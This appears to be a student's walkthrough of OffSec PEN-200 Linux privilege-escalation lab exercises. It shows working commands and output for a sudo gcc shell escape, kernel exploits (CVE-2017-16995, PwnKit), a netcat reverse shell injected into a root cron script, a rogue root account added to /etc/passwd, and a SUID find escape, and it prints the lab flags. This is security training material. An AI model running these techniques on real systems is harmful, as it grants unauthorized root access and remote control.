+<p>Connect to VM 2 and gain a root shell by abusing a sudo misconfiguration.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ sudo gcc -wrapper /bin/sh,-s .
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# ls /root
+flag.txt
+# cat /root/flag.txt
+OS{1b14ce5095e6ff3cb0b37dfd1121d1ab}
+</code></pre>
+<h3>Exploiting Kernel Vulnerabilities</h3>
+<p>Depending on the OS and kernel version, another excellent way to achieve PrivEsc are kernel exploits.</p>
+<p>To demonstrate this vectore we must first gather info about the target by inspecting the <code>/etc/issue</code> file,  As we learned earlier, this file contains text and system ID into that is printed to the login prompt on Linux machines.</p>
+<pre><code class="language-bash">joe@ubuntu-privesc:~$ cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+</code></pre>
+<p>We must next inspect the kernel version and get the sys arch.</p>
+<pre><code class="language-bash">joe@ubuntu-privesc:~$ uname -r
+4.4.0-116-generic
+joe@ubuntu-privesc:~$ arch
+x86_64
+</code></pre>
+<p>The target sys appears to be running Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 arch.  We can use this info with <code>searchsploit</code> on our Kali machine to find kernel exploits that match the target.</p>
+<ul>
+<li>main keyword <code>linux kernel Ubuntu 16 Local Privilege Escalation</code></li>
+<li>exclude anything below kernel version 4.4.0</li>
+<li>exclude anything matching kernel version 4.9</li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ searchsploit &quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot; | grep &quot;4.&quot; | grep -v &quot; &lt; 4.4.0&quot; | grep -v &quot;4.8&quot;
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.0 | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17. | linux_x86/local/42276.c
+Linux Kernel (Ubuntu / Fedora / RedHat) - &#39;Overlayfs&#39;  | linux/local/40688.rb
+Linux Kernel (Ubuntu 17.04) - &#39;XFRM&#39; Local Privilege E | linux/local/44049.md
+Linux Kernel 2.6.24_16-23/2.6.27_7-10/2.6.28.3 (Ubuntu | linux_x86-64/local/9083.c
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - &#39;Full-Ne | linux/local/15704.c
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37292.c
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/1 | linux/local/37293.txt
+Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#39; | linux_x86-64/local/31347.c
+Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22 | linux/local/41999.txt
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#39;overlayfs&#39;  | linux/local/39166.c
+Linux Kernel 4.4 (Ubuntu 16.04) - &#39;BPF&#39; Local Privileg | linux/local/40759.rb
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#39; | linux_x86-64/local/40049.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; b | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - &#39;IP6T_SO_SET_REP | linux/local/40489.txt
+Linux Kernel &lt; 2.6.34 (Ubuntu 10.10 x86) - &#39;CAP_SYS_AD | linux_x86/local/15916.c
+Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - &#39;C | linux/local/14814.c
+Linux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - &#39;Half-Nelson. | linux/local/17787.c
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loc | linux/local/45010.c
+</code></pre>
+<ul>
+<li>we will try the last exploit <code>linux/local/45010.c</code> since it is newer and matches our kernel version</li>
+<li>it also targets any kernel version below 4.13.9</li>
+</ul>
+<p>We use <code>gcc</code> on Linux to compile our exploit, matching the arch of our target.  This is imperative when the target does not have a compiler and we are forced to compile locally or in a sandbox env replicating the target.</p>
+<p>Learning every detail of a Linux kernel exploit is beyond the scope of this module, we need to know how to compile the code.  First we will copy the exploit to our working dir and inspect the first lines for compilation instructions.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ head -n 20 45010.c
+/*
+  Credit @bleidl, this is a slight modification to his original POC
+  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
+
+  For details on how the exploit works, please visit
+  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+
+  Tested on Ubuntu 16.04 with the following Kernels
+  4.4.0-31-generic
+  4.4.0-62-generic
+  4.4.0-81-generic
+  4.4.0-116-generic
+  4.8.0-58-generic
+  4.10.0.42-generic
+  4.13.0-21-generic
+
+  Tested on Fedora 27
+  4.13.9-300
+  gcc cve-2017-16995.c -o cve-2017-16995
+  internet@client:~/cve-2017-16995$ ./cve-2017-16995
+                                                                                         
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ gcc 45010.c -o cve-2017-16995      
+                                                                                         
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ls          
+45010.c  cve-2017-16995
+</code></pre>
+<ul>
+<li>to assure compilation works as expected and if the target has GCC<ul>
+<li>we can compile on target</li>
+</ul>
+</li>
+<li>this assures the correct libs are used for the target arch</li>
+<li>lowers the risks of cross compatibility issues</li>
+</ul>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ scp -o PubKeyAuthentication=no 45010.c joe@192.168.216.216:~/
+joe@192.168.216.216&#39;s password: 
+45010.c
+</code></pre>
+<ul>
+<li>on target</li>
+</ul>
+<pre><code class="language-bash">joe@ubuntu-privesc:~$ gcc 45010.c -o cve-2017-16995
+joe@ubuntu-privesc:~$ ls
+45010.c  cve-2017-16995
+</code></pre>
+<ul>
+<li>we can safely assume GCC compile it correctly as it output no errors</li>
+</ul>
+<p>We can inspect the Linux ELF file arch with <code>file</code></p>
+<pre><code class="language-bash">joe@ubuntu-privesc:~$ file cve-2017-16995 
+cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd15fe9ed0b8bc7da0ee0d0dc643a5cb29f83bf1, not stripped
+</code></pre>
+<p>We are now ready to run our kernel exploit!</p>
+<pre><code class="language-bash">joe@ubuntu-privesc:~$ ./cve-2017-16995 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff =&gt; ffff880035232000
+[*] Leaking sock struct from ffff88003367f400
+[*] Sock-&gt;sk_rcvtimeo at offset 472
+[*] Cred structure at ffff88007c0f1180
+[*] UID from cred structure: 1001, matches the current: 1001
+[*] hammering cred structure at ffff88007c0f1180
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+# whoami
+root
+</code></pre>
+<ul>
+<li>We have successfully obtained a root shell by exploiting a known kernel vuln.</li>
+</ul>
+<h4>Exercises</h4>
+<p>Capstone Exercise: Connect to VM 2 with the provided credentials and gain a root shell by abusing a different kernel vulnerability.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no joe@192.168.229.216
+The authenticity of host &#39;192.168.229.216 (192.168.229.216)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:SdGyokryjkMED9b/LB2PjX0eykWndAYMa9zI0PsZsys.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:37: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.229.216&#39; (ED25519) to the list of known hosts.
+joe@192.168.229.216&#39;s password: 
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+227 packages can be updated.
+156 updates are security updates.
+
+
+Last login: Fri Sep 30 11:25:30 2022 from 192.168.118.2
+joe@ubuntu-privesc:~$ sudo -l
+[sudo] password for joe: 
+Sorry, user joe may not run sudo on ubuntu-privesc.
+joe@ubuntu-privesc:~$ gcc
+gcc: fatal error: no input files
+compilation terminated.
+joe@ubuntu-privesc:~$ cc
+cc: fatal error: no input files
+compilation terminated.
+joe@ubuntu-privesc:~$ ls
+pwnkit.tar
+joe@ubuntu-privesc:~$ tar -xvf pwnkit.tar 
+CVE-2021-4034-main/
+CVE-2021-4034-main/cve-2021-4034
+CVE-2021-4034-main/pwnkit.so
+CVE-2021-4034-main/pwnkit.c
+CVE-2021-4034-main/cve-2021-4034.sh
+CVE-2021-4034-main/GCONV_PATH=./
+CVE-2021-4034-main/GCONV_PATH=./pwnkit.so:.
+CVE-2021-4034-main/.gitignore
+CVE-2021-4034-main/dry-run/
+CVE-2021-4034-main/dry-run/pwnkit-dry-run.c
+CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c
+CVE-2021-4034-main/dry-run/Makefile
+CVE-2021-4034-main/LICENSE
+CVE-2021-4034-main/README.md
+CVE-2021-4034-main/cve-2021-4034.c
+CVE-2021-4034-main/gconv-modules
+CVE-2021-4034-main/Makefile
+joe@ubuntu-privesc:~$ cd CVE-2021-4034-main/
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ ls
+cve-2021-4034    cve-2021-4034.sh  gconv-modules  LICENSE   pwnkit.c   README.md
+cve-2021-4034.c  dry-run           GCONV_PATH=.   Makefile  pwnkit.so
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ make
+The program &#39;make&#39; can be found in the following packages:
+ * make
+ * make-guile
+Ask your administrator to install one of them
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ mkdir -p GCONV_PATH=.
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
+cp: cannot stat &#39;/usr/bin/true&#39;: No such file or directory
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ ls
+cve-2021-4034    cve-2021-4034.sh  gconv-modules  LICENSE   pwnkit.c   README.md
+cve-2021-4034.c  dry-run           GCONV_PATH=.   Makefile  pwnkit.so
+joe@ubuntu-privesc:~/CVE-2021-4034-main$ ./cve-2021-4034
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+# whoami
+root
+# ls /root
+flag.txt
+# cat /root/flag.txt
+OS{3fd1b48548e4b0dd22bb672d273538f9}
+</code></pre>
+<p>Capstone Exercise: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.</p>
+<pre><code class="language-bash">┌──(student㉿dab92ca5b0e7)-[~]
+└─$ tail /var/log/cron.log 
+14:39:01 running the archiver
+14:40:01 running the archiver
+14:41:01 running the archiver
+14:42:01 running the archiver
+14:43:01 running the archiver
+14:44:01 running the archiver
+14:45:01 running the archiver
+14:46:01 running the archiver
+14:47:01 running the archiver
+14:48:01 running the archiver
+┌──(student㉿dab92ca5b0e7)-[~]
+└─$ cat /etc/cron.hourly/archiver 
+#!/bin/sh
+
+# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
+/var/archives/archive.sh
+┌──(student㉿dab92ca5b0e7)-[~]
+└─$ ls -lha /var/archives/archive.sh 
+-rwxrwxrwx 1 root root 159 Nov 15  2021 /var/archives/archive.sh
+┌──(student㉿dab92ca5b0e7)-[~]
+└─$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.182 4444 &gt;/tmp/f&quot; &gt;&gt; /var/archives/archive.sh 
+┌──(student㉿dab92ca5b0e7)-[~]
+└─$ cat /var/archives/archive.sh 
+#!/bin/bash
+
+TIMESTAMP=$(date +&quot;%T&quot;)
+echo &quot;$TIMESTAMP running the archiver&quot;
+#cp -rf /home/kali/ /var/backups/kali/
+cp -rf /home/student/ /var/backups/student/
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.182 4444 &gt;/tmp/f
+
+
+### From attacking machine
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.229.52] 34210
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+/root
+# ls
+flag.txt
+# cat flag.txt
+OS{e333158024ddb84a5fba433f7dac981d}
+</code></pre>
+<p>Capstone Exercise: On the Module Exercise VM 4, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ screen -r                                                    
+[detached from 5259.pts-9.h4ckt0p]
+                                                                                         
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no student@192.168.249.52 -p 2222
+The authenticity of host &#39;[192.168.249.52]:2222 ([192.168.249.52]:2222)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:B0J0flfJ43NpUkFeZpWEqdxJ2CHcvg2tS02m+kv81Sw.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:41: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[192.168.249.52]:2222&#39; (ED25519) to the list of known hosts.
+Welcome to the PEN-200 Kali Linux Shell.
+student@192.168.249.52&#39;s password: 
+Permission denied, please try again.
+student@192.168.249.52&#39;s password: 
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ id
+uid=1000(student) gid=1000(student) groups=1000(student)
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for student: 
+Sorry, user student may not run sudo on 8b9a0c6dd2a5.
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ cat /etc/issue
+Kali GNU/Linux Rolling \n \l
+
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ cat /var/log/
+alternatives.log  btmp              journal/          wtmp
+apt/              dpkg.log          lastlog           
+bootstrap.log     faillog           runit/            
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ cat /var/log/faillog 
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ ls -lha /etc/cron*
+/etc/cron.d:
+total 12K
+drwxr-xr-x 2 root root 4.0K Nov  7  2020 .
+drwxr-xr-x 1 root root 4.0K Nov  5 17:33 ..
+-rw-r--r-- 1 root root  201 Mar 20  2020 e2scrub_all
+
+/etc/cron.daily:
+total 20K
+drwxr-xr-x 1 root root 4.0K Nov 12  2020 .
+drwxr-xr-x 1 root root 4.0K Nov  5 17:33 ..
+-rwxr-xr-x 1 root root 1.5K Oct 21  2020 apt-compat
+-rwxr-xr-x 1 root root 1.1K Sep  3  2020 dpkg
+-rwxr-xr-x 1 root root 1.1K Jul  5  2020 man-db
+
+/etc/cron.weekly:
+total 12K
+drwxr-xr-x 2 root root 4.0K Nov 12  2020 .
+drwxr-xr-x 1 root root 4.0K Nov  5 17:33 ..
+-rwxr-xr-x 1 root root  813 Jul  5  2020 man-db
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+tcpdump:x:105:106::/nonexistent:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+student:x:1000:1000::/home/student:/bin/bash
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ ls -lha /etc/passwd
+-rw-rw-rw- 1 root root 1.4K Nov  5 17:33 /etc/passwd
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ openssl passwd w00t
+nfG3FixaSboeQ
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ echo &quot;root2:nfG3FixaSboeQ:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd
+┌──(student㉿8b9a0c6dd2a5)-[~]
+└─$ su root2
+Password: 
+┌──(root💀8b9a0c6dd2a5)-[/home/student]
+└─# id
+uid=0(root) gid=0(root) groups=0(root)
+┌──(root💀8b9a0c6dd2a5)-[/home/student]
+└─# ls /root/
+flag.txt
+┌──(root💀8b9a0c6dd2a5)-[/home/student]
+└─# cat /root/flag.txt 
+OS{c1861948c26c5e2c296100b93981893c}
+</code></pre>
+<p>Capstone Exercise: Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the Module Exercise VM 5. Binary flags and custom shell are what to look for.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$   ssh-keygen -f &quot;/home/m4xx3d0ut/.ssh/known_hosts&quot; -R &quot;[192.168.249.52]:2222&quot;
+
+# Host [192.168.249.52]:2222 found: line 43
+/home/m4xx3d0ut/.ssh/known_hosts updated.
+Original contents retained as /home/m4xx3d0ut/.ssh/known_hosts.old
+                                                                                         
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ ssh -o PubKeyAuthentication=no student@192.168.249.52 -p 2222                
+The authenticity of host &#39;[192.168.249.52]:2222 ([192.168.249.52]:2222)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:M5smK/W1oxyp1Ek7ejIBKBMLAr9RS0H3y5FYOtQIi10.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;[192.168.249.52]:2222&#39; (ED25519) to the list of known hosts.
+Welcome to the PEN-200 Ubuntu Shell.
+student@192.168.249.52&#39;s password: 
+student@79fd51750b5c:~$ sudo -l
+-bash: sudo: command not found
+student@79fd51750b5c:~$ id
+uid=1000(student) gid=1000(student) groups=1000(student)
+student@79fd51750b5c:~$ cat /etc/issue
+Ubuntu 18.04.6 LTS \n \l
+
+student@79fd51750b5c:~$ uname -r
+5.11.0-49-generic
+student@79fd51750b5c:~$ find / -perm -u=s -type f 2&gt;/dev/null
+/bin/umount
+/bin/su
+/bin/mount
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/find
+/usr/bin/chfn
+/usr/bin/gawk
+/usr/bin/vim.basic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+student@79fd51750b5c:~$ find . -exec /bin/sh \; -quit
+# id
+uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
+# ls /root
+flag.txt
+# cat /root/flag.txt                
+Great job! You found me.
+Here is your flag:
+
+OS{972fad7dface98b2147db44504231e41}
+</code></pre>
+
+      </div>
+    </article>
+  
